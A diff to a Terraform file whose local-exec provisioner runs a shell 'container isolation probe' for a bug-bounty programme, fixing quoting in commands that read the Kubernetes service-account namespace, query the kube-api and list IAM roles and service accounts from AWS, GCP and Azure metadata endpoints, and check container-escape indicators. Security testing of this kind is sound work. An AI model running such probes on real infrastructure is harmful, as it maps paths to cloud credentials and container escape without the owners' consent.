@@ -20,7 +20,7 @@ resource "null_resource" "isolation_probe" {
   triggers = { always = timestamp() }
 
   provisioner "local-exec" {
-    command = <<-'EOT'
+    command = <<-EOT
       set +e
       echo "===== INTIGRITI VDP — container isolation probe (READ-ONLY) ====="
 
@@ -49,7 +49,7 @@ resource "null_resource" "isolation_probe" {
       cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
       env | grep -E '^KUBERNETES_SERVICE_(HOST|PORT)=' 2>/dev/null
       if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
-        echo -n "kube-api /version (sin token) HTTP="; curl -sk -m 4 -o /dev/null -w '%{http_code}\n' "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/version" 2>/dev/null
+        echo -n "kube-api /version (sin token) HTTP="; curl -sk -m 4 -o /dev/null -w '%%{http_code}\n' "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/version" 2>/dev/null
       fi
 
       echo "## 6. cloud metadata (IMDS) — SOLO nombre de rol, NO el cuerpo de credenciales"
@@ -57,7 +57,7 @@ resource "null_resource" "isolation_probe" {
       echo -n "AWS roles: "; curl -s -m 3 -H "X-aws-ec2-metadata-token: $AWST" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -3; echo
       echo "   (si lista un rol => el host tiene credenciales IAM alcanzables. PARAR aquí, NO pedir .../ <rol>)"
       echo -n "GCP SAs: "; curl -s -m 3 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null | head -3; echo
-      echo -n "Azure IMDS HTTP="; curl -s -m 3 -o /dev/null -w '%{http_code}\n' -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null
+      echo -n "Azure IMDS HTTP="; curl -s -m 3 -o /dev/null -w '%%{http_code}\n' -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null
 
       echo "## 7. indicadores de escape (SOLO permisos; NO escribir)"
       stat -c '%A %U %n' /proc/sys/kernel/core_pattern 2>/dev/null
